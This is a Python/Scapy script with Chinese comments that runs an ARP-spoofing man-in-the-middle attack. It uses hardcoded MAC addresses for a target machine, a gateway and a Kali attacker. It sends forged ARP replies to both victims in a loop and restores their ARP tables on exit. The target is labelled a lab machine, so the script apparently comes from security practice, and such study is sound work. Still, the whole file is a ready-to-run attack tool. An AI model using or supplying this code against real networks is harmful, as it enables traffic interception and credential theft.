#-- coding:UTF-8 --
from scapy.all import *

target1_mac = "00:0c:29:5d:e8:c3"    #靶机本机的Mac地址
target2_mac = "00:50:56:e8:44:a5"    #网关的Mac地址
send_mac = "00:0c:29:a5:82:6c"  #攻击机kali的Mac地址

#Arp欺骗
def Arp_Spoof(target_ip, target_mac, sender_ip):
    #构造欺骗ARP包
    spoofedarp = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)
    send(spoofedarp, verbose=False)

#Arp表恢复
def Arp_Restore(target_ip, target_mac, sender_ip, sender_mac):
    #构造正常ARP包
    normalarp = ARP(op=2, hwsrc=sender_mac, psrc=sender_ip, hwdst=target_mac, pdst=target_ip)
    send(normalarp, verbose=False)
    print("ARP Table restored to normal for", target_ip)

#主函数
def main():
    #设置Target1和Target2
    target1_ip = input("Target1 IP:")
    target2_ip = input("Target2 IP:")

    #获取靶机本机Mac地址
    try:
        print("Target1 MAC:", target1_mac)
    except:
        print("ERROR: Target1 did not respond ARP broadcast.")
        quit()

    #获取网关Mac地址
    try:
        print("Target2 MAC:", target2_mac)
    except:
        print("ERROR: Target2 did not respond ARP broadcast.")
        quit()

    try:
        print("Sending spoofed ARP responses.")
        while True:
            #进行Arp欺骗中间人攻击
            Arp_Spoof(target1_ip, target1_mac, target2_ip) #欺骗靶机
            Arp_Spoof(target2_ip, target2_mac, target1_ip) #欺骗网关
    except:
        print("ARP spoofing stopped.")
        #恢复Arp表
        Arp_Restore(target1_ip, target1_mac, target2_ip, target2_mac)  # 恢复靶机Arp表
        Arp_Restore(target2_ip, target2_mac, target1_ip, target1_mac)  #恢复网关Arp表
        quit()


if __name__ == "__main__":
    main()
